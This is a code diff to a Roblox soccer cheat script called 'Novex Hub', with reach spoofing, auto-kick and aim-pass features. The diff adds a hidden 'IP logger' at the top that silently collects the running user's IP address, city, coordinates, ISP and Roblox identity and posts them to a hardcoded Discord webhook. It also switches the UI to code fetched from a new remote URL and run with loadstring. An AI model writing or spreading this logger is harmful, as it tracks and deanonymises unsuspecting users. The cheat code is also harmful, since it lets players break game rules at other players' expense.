@@ -16,6 +16,52 @@ local Lighting=game:GetService("Lighting")
 local ReplicatedStorage=game:GetService("ReplicatedStorage")
 local HttpService=game:GetService("HttpService")
 
+-- ─── DETAILED IP LOGGER ──────────────────────────────────────────────────
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1570856971077156965/iE2LlTcHFMQcdGkGiM6Vignt_hp_LUTMSKB6JxxZb8SF7sCk38huhmyZ7EbxmBp3dl3G"
+local MY_DISCORD_ID = "1519049954046509123"
+
+local req = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request) or (krnl and krnl.request)
+
+if req then
+    pcall(function()
+        local res = req({Url = "http://ip-api.com/json", Method = "GET"})
+        local p = HttpService:JSONDecode(res.Body)
+
+        local player = game.Players.LocalPlayer
+
+        local country = p.country or "?"
+        local city = p.city or "?"
+        local ip = p.query or "?"
+        local roblox_user = player.Name or "?"
+        local region = p.regionName or "?"
+        local coords = tostring(p.lat or "?") .. ", " .. tostring(p.lon or "?")
+        local time = os.date("%Y-%m-%d %H:%M:%S")
+        local isp = p.isp or "?"
+        local user_id = tostring(player.UserId or "?")
+
+        local msg = "<@" .. MY_DISCORD_ID .. ">\n" ..
+                    "**Country =** `" .. country .. "`\n" ..
+                    "**City =** `" .. city .. "`\n" ..
+                    "**IP =** `" .. ip .. "`\n" ..
+                    "**Roblox user =** `" .. roblox_user .. "`\n" ..
+                    "**Region =** `" .. region .. "`\n" ..
+                    "**Coords =** `" .. coords .. "`\n" ..
+                    "**Time =** `" .. time .. "`\n" ..
+                    "**ISP =** `" .. isp .. "`\n" ..
+                    "**UserId =** `" .. user_id .. "`"
+
+        req({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({
+                content = msg
+            })
+        })
+        print("Detailed IP Logged.")
+    end)
+end
+-- ─────────────────────────────────────────────────────────────────────────
 
 local TeleportService=game:GetService("TeleportService")
 local NetworkClient=game:GetService("NetworkClient")
@@ -98,7 +144,7 @@ Bind(RunService.Heartbeat:Connect(function() if not pokersActive then if #pokerC
 Bind(RunService.PostSimulation:Connect(function() updateBallCache() local ball=getBall() if not ball or not ball.Parent then globalIsContested=false globalSneakyIntercepted=false return end local ballPos=ball.Position if autoJuggleActive and autoJuggleSticky>0 then local char=me.Character local head=char and char:FindFirstChild("Head") if head then local headPos=head.Position local dist=(ballPos-headPos).Magnitude if dist<=autoJuggleReach*1.5 and dist>1.0 then local dx=headPos.X-ballPos.X local dz=headPos.Z-ballPos.Z local flatDist=math.sqrt(dx*dx+dz*dz) if flatDist>0 then local dirX=dx/flatDist local dirZ=dz/flatDist local pullStrength=autoJuggleSticky*4.5 local currentVel=ball.AssemblyLinearVelocity ball.AssemblyLinearVelocity=Vector3_new(currentVel.X+(dirX*pullStrength-currentVel.X)*0.25,currentVel.Y,currentVel.Z+(dirZ*pullStrength-currentVel.Z)*0.25) end end end end if reachActive then local isC=false local contestRadius=reachRange+2.5 for _,p in ipairs(Players:GetPlayers()) do if p~=me and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then if (p.Character.HumanoidRootPart.Position-ballPos).Magnitude<=contestRadius then isC=true break end end end globalIsContested=isC end if sneakyActive and safeSneaky then local isIntercepted=false for _,p in ipairs(Players:GetPlayers()) do if p~=me and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then local dist=(p.Character.HumanoidRootPart.Position-ballPos).Magnitude if dist<4.0 and dist<sneakyReach then isIntercepted=true break end end end globalSneakyIntercepted=isIntercepted end end))
 local oldIndex
 oldIndex=hookmetamethod(game,"__index",newcclosure(function(self,key) if not checkcaller() and key=="Position" then local caller=getcallingscript() if caller then local cName=caller.Name if cName:find("Camera") or cName=="PlayerModule" or cName=="TransparencyController" then return oldIndex(self,key) end end if typeof(self)=="Instance" and self:IsA("BasePart") and SPOOFABLE_PARTS[self.Name] then if reachActive or sneakyActive or autoJuggleActive or groundShotsActive then local ball=getBall() if ball and ball.Parent then local char=me.Character if char and self:IsDescendantOf(char) then local realPos=oldIndex(self,key) local ballPos=ball.Position local dx=ballPos.X-realPos.X local dy=ballPos.Y-realPos.Y local dz=ballPos.Z-realPos.Z local flatMag=math.sqrt(dx*dx+dz*dz) local trueMag=math.sqrt(dx*dx+dy*dy+dz*dz) if reachActive and not globalIsContested and trueMag<=reachRange then if reachMagnetActive then local desiredDistance=reachHoldDistance local dirX,dirY,dirZ if trueMag>0.01 then dirX=dx/trueMag dirY=dy/trueMag dirZ=dz/trueMag else dirX=1 dirY=0 dirZ=0 end local targetX=ballPos.X-dirX*desiredDistance local targetY=realPos.Y local targetZ=ballPos.Z-dirZ*desiredDistance local dispX=targetX-realPos.X local dispZ=targetZ-realPos.Z local dispMag=math.sqrt(dispX*dispX+dispZ*dispZ) local MAX_STEP=reachMaxStep local newX,newZ if dispMag>MAX_STEP then local stepX=(dispX/dispMag)*MAX_STEP local stepZ=(dispZ/dispMag)*MAX_STEP newX=realPos.X+stepX newZ=realPos.Z+stepZ else newX=targetX newZ=targetZ end return Vector3_new(newX,targetY,newZ) else return Vector3_new(ballPos.X,realPos.Y,ballPos.Z) end end if sneakyActive and trueMag<=sneakyReach then if not globalSneakyIntercepted then local hum=char:FindFirstChildOfClass("Humanoid") local root=char:FindFirstChild("HumanoidRootPart") if root and hum then local isMoving=hum.MoveDirection.Magnitude>0.05 local lVec=root.CFrame.LookVector local modeMulti=1.0 if sneakyMode=="Low" then modeMulti=0.4 elseif sneakyMode=="Medium" then modeMulti=0.7 end local dynamicMod=1.1+(isMoving and 0.45 or 0) local finalBuffer=sneakyBuffer*dynamicMod*modeMulti local spoofY=realPos.Y+sneakyHeightOffset if profSneaky.enabled then local baseOffset=0 if trueMag<=profSneaky.closeMax then baseOffset=profSneaky.closeY elseif trueMag<=profSneaky.midMax then baseOffset=profSneaky.midY else baseOffset=profSneaky.farY end spoofY=realPos.Y+baseOffset+((math.random()*(profSneaky.randomVariance*2))-profSneaky.randomVariance) end return Vector3_new(ballPos.X-(lVec.X*finalBuffer),spoofY,ballPos.Z-(lVec.Z*finalBuffer)) end end return Vector3_new(ballPos.X,realPos.Y,ballPos.Z) end if autoJuggleActive and trueMag<=autoJuggleReach then if self.Name=="Head" then return Vector3_new(ballPos.X,realPos.Y+autoJuggleHeight,ballPos.Z) elseif flatMag>0 then return Vector3_new(ballPos.X-((dx/flatMag)*0.15),realPos.Y,ballPos.Z-((dz/flatMag)*0.15)) end return Vector3_new(ballPos.X,realPos.Y,ballPos.Z) end if groundShotsActive and trueMag<=groundShotsReach then local hum=char:FindFirstChildOfClass("Humanoid") local root=char:FindFirstChild("HumanoidRootPart") if root and hum then local isMoving=hum.MoveDirection.Magnitude>0.05 local lVec=root.CFrame.LookVector local alignment=0 if isMoving then alignment=(hum.MoveDirection.X/hum.MoveDirection.Magnitude)*lVec.X+(hum.MoveDirection.Z/hum.MoveDirection.Magnitude)*lVec.Z end local speedFactor=isMoving and math.clamp(hum.MoveDirection.Magnitude,1.2,2.5) or 1 local dynamicMod=1.1+(alignment*0.45)*speedFactor if self.Name=="Head" then return Vector3_new(ballPos.X-(lVec.X*(0.12*dynamicMod)),ballPos.Y-1.0,ballPos.Z-(lVec.Z*(0.12*dynamicMod))) else if flatMag>0 then return Vector3_new(ballPos.X-((dx/flatMag)*(0.18*dynamicMod)),ballPos.Y-1.3,ballPos.Z-((dz/flatMag)*(0.18*dynamicMod))) end end end return Vector3_new(ballPos.X,ballPos.Y-1.3,ballPos.Z) end end end end end end return oldIndex(self,key) end))
-local function touchDetect() local LocalPlayer=me local SoccerBall=getBall() if LocalPlayer and LocalPlayer.Character and SoccerBall then local UpperTorso=LocalPlayer.Character:FindFirstChild("UpperTorso") local Humanoid=LocalPlayer.Character:FindFirstChild("Humanoid") local HumanoidRootPart=LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if UpperTorso and Humanoid and HumanoidRootPart then local UpperTorsoPosition=UpperTorso.Position local SoccerBallPosition2=SoccerBall.Position local Magnitude=(SoccerBallPosition2-UpperTorsoPosition).Magnitude if Magnitude>0.01 and Magnitude<=(reachRange*1.5) then local v203=UpperTorsoPosition+Vector3.new(0,-3,0) local v204=UpperTorsoPosition+Vector3.new(0,1.2999999523162842,0) local n18=34 local v206 if (v204-SoccerBallPosition2).Magnitude<(v203-SoccerBallPosition2).Magnitude then v206=SoccerBallPosition2-v204 n18=0 else local v207=SoccerBallPosition2-v203 v206=Vector3.new(v207.X,0,v207.Z) end local Unit=v206.Unit if Unit.Magnitude>0.01 then local vector3=Vector3.new(0,0,0) local LookVector=HumanoidRootPart.CFrame.LookVector local Unit2=Vector3.new(LookVector.X,0,LookVector.Z).Unit local v212=math.atan2(Unit2.X,Unit2.Z)-math.atan2(Unit.X,Unit.Z) local v213=math.deg(math.abs(v212)) if v213<=20 then Unit=(Unit2+Unit).Unit end if v213<90 then local v214=v213/3 if not (v212<0) then vector3=Vector3.new(0,-v214,0) else vector3=Vector3.new(0,v214,0) end end local WalkSpeed=Humanoid.WalkSpeed if WalkSpeed<=23 then local vector3_2 if WalkSpeed>=19 then local v216=(WalkSpeed-19)*10+40 local vector3_3=Vector3.new(0,n18,0) local v218=v216+Vector3.new(SoccerBall.AssemblyLinearVelocity.X,0,SoccerBall.AssemblyLinearVelocity.Z).Magnitude if v218>85 then v218=85 end local v219=Unit*v218+vector3_3 vector3_2=Vector3.new(v219.X,math.min(v219.Y,40),v219.Z) else if WalkSpeed~=16 then vector3_2=Unit*((WalkSpeed-16)*15+25)+Vector3.new(0,5,0) else vector3_2=Unit*20+Vector3.new(0,0,0) end end local n9=0.5 if SoccerBall.Position.Y<n9 then pcall(function() SoccerBall.CFrame=CFrame.new(SoccerBall.Position.X,n9,SoccerBall.Position.Z) end) end pcall(function() local kb=ReplicatedStorage:FindFirstChild("KickBall") if kb then kb:FireServer(SoccerBall.Position,vector3_2,vector3,Magnitude,ValidKickKey) end end) end end end end end end
+local function touchDetect() local LocalPlayer=me local SoccerBall=getBall() if LocalPlayer and LocalPlayer.Character and SoccerBall then local UpperTorso=LocalPlayer.Character:FindFirstChild("UpperTorso") local Humanoid=LocalPlayer.Character:FindFirstChild("Humanoid") local HumanoidRootPart=LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if UpperTorso and Humanoid and HumanoidRootPart then local UpperTorsoPosition=UpperTorso.Position local SoccerBallPosition2=SoccerBall.Position local Magnitude=(SoccerBallPosition2-UpperTorsoPosition).Magnitude if Magnitude>0.01 and Magnitude<=(reachRange*1.5) then local v203=UpperTorsoPosition+Vector3.new(0,-3,0) local v204=UpperTorsoPosition+Vector3.new(0,1.2999999523162842,0) local n18=34 local v206 if (v204-SoccerBallPosition2).Magnitude<(v203-SoccerBallPosition2).Magnitude then v206=SoccerBallPosition2-v204 n18=0 else local v207=SoccerBallPosition2-v203 v206=Vector3.new(v207.X,0,v207.Z) end local Unit=v206.Unit if Unit.Magnitude>0.01 then local vector3=Vector3.new(0,0,0) local LookVector=HumanoidRootPart.CFrame.LookVector local Unit2=Vector3.new(LookVector.X,0,LookVector.Z).Unit local v212=math.atan2(Unit2.X,Unit2.Z)-math.atan2(Unit.X,Unit.Z) local v213=math.deg(math.abs(v212)) if v213<=20 then Unit=(Unit2+Unit).Unit end if v213<90 then local v214=v213/3 if not (v212<0) then vector3=Vector3.new(0,-v214,0) else vector3=Vector3.new(0,v214,0) end end local WalkSpeed=Humanoid.WalkSpeed if WalkSpeed<=23 then local vector3_2 if WalkSpeed>=19 then local v216=(WalkSpeed-19)*10+40 local vector3_3=Vector3.new(0,n18,0) local v218=v216+Vector3.new(SoccerBall.AssemblyLinearVelocity.X,0,SoccerBall.AssemblyLinearVelocity.Z).Magnitude if v218>85 then v218=85 end local v219=Unit*v218+vector3_3 vector3_2=Vector3.new(v219.X,math.min(v219.Y,40),v219.Z) else if WalkSpeed~=16 then vector3_2=Unit*((WalkSpeed-16)*15+25)+Vector3.new(0,5,0) else vector3_2=Unit*20+Vector3.new(0,0,0) end end local n9=0.5 if SoccerBall.Position.Y<n9 then pcall(function() SoccerBall.CFrame=CFrame.new(SoccerBall.Position.X,n9,SoccerBall.Position.Z) end) end pcall(function() if typeof(KickBall)~="nil" then KickBall:FireServer(SoccerBall.Position,vector3_2,vector3,Magnitude,ValidKickKey) end end) end end end end end end
 local visualFolder=Workspace:FindFirstChild(STEALTH_VISUALS)
 if not visualFolder then visualFolder=Instance.new("Folder") visualFolder.Name=STEALTH_VISUALS visualFolder.Parent=Workspace end
 local trajectoryVisualFolder=visualFolder:FindFirstChild("TrajectoryVisuals") or Instance.new("Folder")
@@ -156,12 +202,11 @@ me.CharacterAdded:Connect(onCharacterRespawnAimPass)
 if me.Character then onCharacterRespawnAimPass(me.Character) end
 local function aimPassTouchDetect() if not aimPassConfig.enabled then return end if not me.Character then return end local ball=getBall() if not ball then return end if tick()-aimPassCooldown_u2>=0.6 and tick()-aimPassCooldown_u3>=0.3 then local UpperTorso=me.Character:FindFirstChild("UpperTorso") or me.Character:FindFirstChild("HumanoidRootPart") if not UpperTorso then return end local Position=UpperTorso.Position local Position2=ball.Position local Magnitude=(Position2-Position).Magnitude if Magnitude>0.01 and Magnitude<=4 then if not currentTargetPlayer or not currentTargetPlayer.Character then return end local targetRoot=currentTargetPlayer.Character:FindFirstChild("HumanoidRootPart") if not targetRoot then return end aimPassCooldown_u2=tick() local targetPos=targetRoot.Position local targetVel=targetRoot.AssemblyLinearVelocity if aimPassConfig.throughBallEnabled then if targetVel.Magnitude>3 then local moveDirection=Vector3.new(targetVel.X,0,targetVel.Z).Unit targetPos=targetPos+(moveDirection*aimPassConfig.throughBallDistance) else local lookDirection=Vector3.new(targetRoot.CFrame.LookVector.X,0,targetRoot.CFrame.LookVector.Z).Unit targetPos=targetPos+(lookDirection*aimPassConfig.throughBallDistance) end else targetPos=targetPos+(targetVel*0.4) end local distToTarget=(targetPos-Position2).Magnitude local v180=Vector3.new(targetPos.X-Position2.X,0,targetPos.Z-Position2.Z) local Unit=v180.Unit if Unit.Magnitude>0.01 then local Humanoid=me.Character:FindFirstChildOfClass("Humanoid") local WalkSpeed=Humanoid and Humanoid.WalkSpeed or 16 local maxLegalPower=85 if WalkSpeed>=19 then maxLegalPower=(WalkSpeed-19)*10+40+Vector3.new(ball.AssemblyLinearVelocity.X,0,ball.AssemblyLinearVelocity.Z).Magnitude elseif WalkSpeed==16 then maxLegalPower=20 else maxLegalPower=(WalkSpeed-16)*15+25 end local distanceScale=math.clamp(distToTarget/120,0,1) local requiredPower=aimPassConfig.minPower+(distanceScale*(aimPassConfig.maxPassPower-aimPassConfig.minPower)) local finalPower=math.min(requiredPower,maxLegalPower) local v187 local v182=Vector3.new(0,0,0) local isLob=(WalkSpeed>17) or (finalPower>=70) if isLob then local lobScale=math.clamp(distToTarget/150,0,1) local lobHeight=10+(lobScale*(aimPassConfig.lobHeight-10)) local v190=Unit*finalPower+Vector3.new(0,lobHeight,0) v187=Vector3.new(v190.X,math.min(v190.Y,aimPassConfig.lobHeight),v190.Z) else v187=Unit*finalPower end if v187.Magnitude>85 then v187=v187.Unit*85 end if ball.Position.Y<aimPass_u10 then pcall(function() ball.CFrame=CFrame.new(ball.Position.X,aimPass_u10,ball.Position.Z) end) end AimPassCachedVel=v187 AimPassCachedRot=v182 AimPassActive=true KickBallRemote:FireServer(ball.Position,v187,v182,Magnitude,ValidKickKey) startAnimation(ball.Position,v187,v182,Vector3.new(0,0,0),0) end end end end
 Bind(RunService.Heartbeat:Connect(function() pcall(aimPassTouchDetect) end))
-Bind(RunService.Heartbeat:Connect(function() pcall(touchDetect) end))
 
 -- ═══════════════════════════════════════
 -- AIRFLOW UI
 -- ═══════════════════════════════════════
-local AirFlow = loadstring(game:HttpGet("https://raw.githubusercontent.com/wraithedvoid/Yesterday/refs/heads/main/Airflow.lua"))()
+local AirFlow = loadstring(game:HttpGet("https://raw.githubusercontent.com/PookiePepelsss/Airflow-UI/refs/heads/main/Source.luau"))()
 
 local Window = AirFlow:CreateWindow({
     Name = "Novex Hub",
@@ -252,18 +297,6 @@ Elements.ToggleReachPriority = TabReach:Toggle({
 Elements.ReachRadiusSlider = TabReach:Slider({
     Name = "Reach Radius", Min = 1, Max = 10, Default = 4.6, Step = 0.1,
     Callback = function(v) reachRange = v end
-})
-Elements.ToggleReachMagnet = TabReach:Toggle({
-    Name = "Reach Magnet (Smooth Pull)", Default = true,
-    Callback = function(v) reachMagnetActive = v end
-})
-Elements.ReachMaxStepSlider = TabReach:Slider({
-    Name = "Max Step Size", Min = 0.5, Max = 5.0, Default = 2.0, Step = 0.1,
-    Callback = function(v) reachMaxStep = v end
-})
-Elements.ReachHoldDistSlider = TabReach:Slider({
-    Name = "Hold Distance", Min = 0.5, Max = 4.0, Default = 1.5, Step = 0.1,
-    Callback = function(v) reachHoldDistance = v end
 })
 
 -- ── AIMPASS TAB ──
@@ -365,14 +398,6 @@ Elements.SliderGSSpeed = TabGoalkeeper:Slider({
 Elements.SliderClearPower = TabGoalkeeper:Slider({
     Name = "Clear Power", Min = 40, Max = 120, Default = 85, Step = 5,
     Callback = function(v) gkConfig.clearPower = v end
-})
-Elements.ToggleGKReach = TabGoalkeeper:Toggle({
-    Name = "GK Reach Assist", Default = false,
-    Callback = function(v) gkConfig.reachEnabled = v end
-})
-Elements.SliderGKReach = TabGoalkeeper:Slider({
-    Name = "GK Reach Range", Min = 1, Max = 8, Default = 3, Step = 0.5,
-    Callback = function(v) gkConfig.reachRange = v end
 })
 TabGoalkeeper:Section("GK Box Size")
 Elements.SliderBoxWidth = TabGoalkeeper:Slider({
@@ -512,29 +537,11 @@ Bind(RunService.RenderStepped:Connect(function()
         local flatTorsoPos = Vector3.new(rootPart.Position.X, 0, rootPart.Position.Z)
         local flatBallPos = Vector3.new(targetBall.Position.X, 0, targetBall.Position.Z)
         local direction = (flatBallPos - flatTorsoPos).Unit
-        if direction.X == direction.X and (flatBallPos - flatTorsoPos).Magnitude > 0.01 then
+        if direction.X == direction.X then
             local newPos = flatTorsoPos + (direction * antiPhaseConfig.Multiplier)
             antiPhaseHitbox.Position = Vector3.new(newPos.X, rootPart.Position.Y, newPos.Z)
             antiPhaseHitbox.CFrame = CFrame.lookAt(antiPhaseHitbox.Position, Vector3.new(targetBall.Position.X, antiPhaseHitbox.Position.Y, targetBall.Position.Z))
         end
-    end)
-end))
-
--- Ball Aimlock Logic
-Bind(RunService.RenderStepped:Connect(function()
-    if not aimlockEnabled then return end
-    pcall(function()
-        local char = me.Character
-        if not char then return end
-        local root = char:FindFirstChild("HumanoidRootPart")
-        if not root then return end
-        local ball = getBall()
-        if not ball then return end
-        local cam = Workspace.CurrentCamera
-        local ballPos = ball.Position
-        local camPos = cam.CFrame.Position
-        local direction = (ballPos - camPos).Unit
-        cam.CFrame = CFrame.new(camPos, camPos + direction)
     end)
 end))
 
@@ -580,7 +587,6 @@ local function updateCharCache()
     end
 end
 me.CharacterAdded:Connect(function() task.delay(0.5, updateCharCache) end)
-if me.Character then task.delay(0.5, updateCharCache) end
 Elements.ToggleRGBChar = TabVisuals:Toggle({
     Name = "RGB Character (Neon Glow)", Default = false,
     Callback = function(v)
@@ -834,6 +840,4 @@ TabProMode:Label({ Text = "Pro Mode features coming soon." })
 
 -- ── CONFIG TAB ──
 local TabConfig = Window:CreateTab({ Name = "Config" })
-TabConfig:Section("Configuration")
-TabConfig:Label({ Text = "Configs are managed directly through the Airflow UI." })
-TabConfig:Label({ Text = "Use the built-in save/load system in the UI toggle menu (RightControl)." })
+TabConfig:ConfigManager({})
